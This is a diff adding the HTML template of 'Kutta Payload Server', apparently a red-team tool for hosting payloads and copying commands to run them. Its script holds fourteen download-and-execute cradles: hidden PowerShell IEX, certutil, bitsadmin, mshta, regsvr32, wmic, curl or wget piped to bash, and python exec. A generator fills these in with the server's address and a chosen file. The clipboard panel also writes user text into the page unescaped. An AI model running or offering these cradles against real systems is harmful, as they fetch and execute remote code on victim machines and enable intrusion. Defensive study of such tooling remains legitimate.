@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kutta Payload Server</title>
+  <link rel="stylesheet" href="../static/style.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="branding" style="display: flex; align-items: center; gap: 10px;">
+    <img src="../static/kutta-logo.png" alt="Kutta Logo" width="100" height="83">
+    <div>
+      <div class="logo-title" style="font-size: 3.2rem; font-weight: bold;">Kutta</div>
+     
+    </div> 
+  </div>
+<p style="font-size: 1.8rem; margin: 0;">Upload and share payloads</p>
+  <div class="directory">Directory: {{.RelPath}}</div>
+</header>
+
+  <main class="main-grid">
+    <section class="panel">
+      <h2>Upload File</h2>
+      <div id="dropZone" class="dropzone">
+        Drag & Drop files here or click to select.
+        <input type="file" id="fileInput" style="display:none" multiple />
+      </div>
+      <div class="upload-actions">
+        <button id="selectAll" class="button">Select All</button>
+        <button id="selectNone" class="button">Select None</button>
+             <button id="generateCradles" class="button">Generate Download and Execute</button>
+        <label for="searchBox">Search:</label>
+        <input type="text" id="searchBox" class="search" placeholder="Type to filter...">
+      </div>
+
+      <form method="POST" action="/bulkdelete">
+        <table class="filetable">
+          <thead>
+            <tr>
+              <th></th>
+              <th>Name</th>
+              <th>Size</th>
+              <th>Last Modified</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="fileTable">
+          {{if .ParentPath}}
+<tr>
+  <td></td>
+  <td>⬅️ <a href="/{{.ParentPath}}">Go Back</a></td>
+  <td></td>
+  <td></td>
+  <td></td>
+</tr>
+{{end}}
+
+
+            {{range .Files}}
+            <tr>
+              <td><input type="checkbox" name="files" value="{{$.RelPath}}/{{.Name}}"></td>
+              <td>
+                {{if .IsDir}}
+                  📂 <a href="/{{$.RelPath}}/{{.Name}}">{{.Name}}</a>
+                {{else}}
+                  {{.Icon}} <a href="/files/{{$.RelPath}}/{{.Name}}" target="_blank">{{.Name}}</a>
+                {{end}}
+              </td>
+              <td>{{.Size}}</td>
+              <td>{{.ModTime}}</td>
+              <td>
+                {{if not .IsDir}}
+                  <a href="/files/{{$.RelPath}}/{{.Name}}" title="Download">⬇️</a>
+                  <a href="/delete?file={{$.RelPath}}/{{.Name}}" title="Delete">🗑️</a>
+                {{end}}
+              </td>
+            </tr>
+            {{end}}
+          </tbody>
+        </table>
+        <button type="submit" class="button danger">Delete Selected</button>
+      </form>
+    </section>
+
+    <section class="panel">
+      <h2>Clipboard</h2>
+      <textarea id="clipboardInput" class="clipboard-input" placeholder="Type text and press Add"></textarea>
+      <div class="clipboard-actions">
+        <button id="addClipboard" class="button">Add</button>
+        <button id="exportClipboard" class="button">Export</button>
+        <button id="clearClipboard" class="button danger">Clear Clipboard</button>
+      </div>
+      <div id="clipboardList" class="clipboard-list"></div>
+    </section>
+    <br>
+      <section class="panel" id="cradlePanel" style="display:none;">
+    <h2>Download and Execute Cradle Generator</h2>
+    <div id="cradleList"></div>
+  </section>
+  </main>
+
+  <footer class="bottombar">
+    <span>{{len .Files}} items</span>
+    <span class="version">kutta v1.0.1 | https://breachsimrange.io</span>
+  </footer>
+
+  <script>
+    document.getElementById('selectAll').addEventListener('click', () => {
+      document.querySelectorAll('input[name="files"]').forEach(cb => cb.checked = true);
+    });
+    document.getElementById('selectNone').addEventListener('click', () => {
+      document.querySelectorAll('input[name="files"]').forEach(cb => cb.checked = false);
+    });
+
+    const searchBox = document.getElementById('searchBox');
+    searchBox.addEventListener('keyup', function() {
+      const term = this.value.trim();
+      if (term) {
+        window.location.search = '?q=' + encodeURIComponent(term);
+      } else {
+        window.location.search = '';
+      }
+    });
+    const dropZone = document.getElementById('dropZone');
+    const fileInput = document.getElementById('fileInput');
+    dropZone.addEventListener('click', () => fileInput.click());
+
+    dropZone.addEventListener('dragover', e => {
+      e.preventDefault();
+      dropZone.classList.add('dragover');
+    });
+    dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
+    dropZone.addEventListener('drop', e => {
+      e.preventDefault();
+      dropZone.classList.remove('dragover');
+      uploadFiles(e.dataTransfer.files);
+    });
+
+    fileInput.addEventListener('change', () => {
+      uploadFiles(fileInput.files);
+    });
+
+    function uploadFiles(files) {
+      const formData = new FormData();
+      for (let i = 0; i < files.length; i++) {
+        formData.append('file', files[i]);
+      }
+      fetch('/upload', { method: 'POST', body: formData }).then(() => location.reload());
+    }
+    const clipboardInput = document.getElementById('clipboardInput');
+    const clipboardList = document.getElementById('clipboardList');
+
+    async function refreshClipboard() {
+      const res = await fetch('/clipboard');
+      const entries = await res.json();
+      clipboardList.innerHTML = entries.map(e => `<div>${e.text} <small>(${new Date(e.timestamp).toLocaleString()})</small></div>`).join('');
+    }
+
+    document.getElementById('addClipboard').addEventListener('click', async () => {
+      const text = clipboardInput.value.trim();
+      if (!text) return;
+      await fetch('/clipboard', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ text })
+      });
+      clipboardInput.value = '';
+      await refreshClipboard();
+    });
+
+    document.getElementById('exportClipboard').addEventListener('click', () => {
+      window.location = '/clipboard/export';
+    });
+
+    document.getElementById('clearClipboard').addEventListener('click', async () => {
+      await fetch('/clipboard/clear', { method: 'POST' });
+      clipboardList.innerHTML = '';
+    });
+
+    refreshClipboard();
+
+const cradles = [
+  {
+    caption: "PowerShell - Invoke-WebRequest + IEX",
+    command: `powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/FILENAME')"`
+  },
+  {
+    caption: "PowerShell - iwr + iex (short)",
+    command: `powershell -nop -w hidden -c "iwr -UseBasicParsing http://IP/FILENAME | iex"`
+  },
+  {
+    caption: "PowerShell - Download + Execute Local (two steps)",
+    command: `powershell -c "$f='FILENAME'; iwr http://IP/$f -OutFile $f; Start-Process $f"`
+  },
+  {
+    caption: "certutil - download EXE + execute",
+    command: `certutil -urlcache -split -f http://IP/FILENAME FILENAME && FILENAME`
+  },
+  {
+    caption: "bitsadmin - download EXE + execute",
+    command: `bitsadmin /transfer myjob /download /priority high http://IP/FILENAME FILENAME && FILENAME`
+  },
+  {
+    caption: "Invoke-Expression with DownloadFile",
+    command: `powershell -c "$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://IP/FILENAME','FILENAME');Start-Process 'FILENAME'"`
+  },
+  {
+    caption: "mshta - run remote HTA/JS/VBS",
+    command: `mshta http://IP/FILENAME`
+  },
+  {
+    caption: "regsvr32 - SCT/DLL",
+    command: `regsvr32 /s /n /u /i:http://IP/FILENAME scrobj.dll`
+  },
+  {
+    caption: "wmic - run PowerShell cradle",
+    command: `wmic process call create "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://IP/FILENAME')"`
+  },
+  {
+    caption: "curl + bash (Linux)",
+    command: `curl -s http://IP/FILENAME | bash`
+  },
+  {
+    caption: "wget + bash (Linux)",
+    command: `wget -qO- http://IP/FILENAME | bash`
+  },
+  {
+    caption: "Python 3 (Linux)",
+    command: `python3 -c "import urllib.request; exec(urllib.request.urlopen('http://IP/FILENAME').read())"`
+  },
+  {
+    caption: "curl download + chmod + exec (Linux)",
+    command: `curl -o FILENAME http://IP/FILENAME && chmod +x FILENAME && ./FILENAME`
+  },
+  {
+    caption: "wget download + chmod + exec (Linux)",
+    command: `wget http://IP/FILENAME -O FILENAME && chmod +x FILENAME && ./FILENAME`
+  }
+];
+
+
+function generateCradles(filename) {
+  const ip = window.location.host;
+  const panel = document.getElementById('cradlePanel');
+  const list = document.getElementById('cradleList');
+  list.innerHTML = '';
+  cradles.forEach(c => {
+    const updated = c.command.replace(/http:\/\/IP\/?/g, `http://${ip}/files/`).replace(/FILENAME/g, filename);
+    const box = document.createElement('div');
+    box.className = 'cradle-box';
+    box.innerHTML = `
+      <strong>${c.caption}</strong>
+      <button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextElementSibling.value)">Copy</button>
+      <textarea readonly rows="2">${updated}</textarea>
+    `;
+    list.appendChild(box);
+  });
+  panel.style.display = 'block';
+}
+
+let selectedFile = null;
+document.getElementById('generateCradles').addEventListener('click', () => {
+  const selected = document.querySelector('input[name="files"]:checked');
+  if (!selected) return alert("Select a file first");
+  selectedFile = selected.value.split("/").pop();
+  generateCradles(selectedFile);
+});
+  </script>
+</body>
+</html>
